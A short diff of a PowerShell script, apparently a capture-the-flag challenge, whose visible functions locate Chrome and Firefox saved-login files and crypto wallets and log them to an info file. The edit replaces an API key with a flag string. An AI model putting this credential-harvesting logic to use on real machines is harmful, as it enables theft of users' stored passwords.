@@ -36,7 +36,7 @@ function Search-ForWallets {
 function Search-ForBrowserCredentials {
     $chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
     $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json"
-    $AuthAPI = "12345678-ABCD-1234-EFGH-56789IJKL012"
+    $AuthAPI = "flаg{API_to_Authenticate}"
 
     Add-Content -Path $infoFilePath -Value "`n### Browser Credential Files ###"
     if (Test-Path $chromePath) {
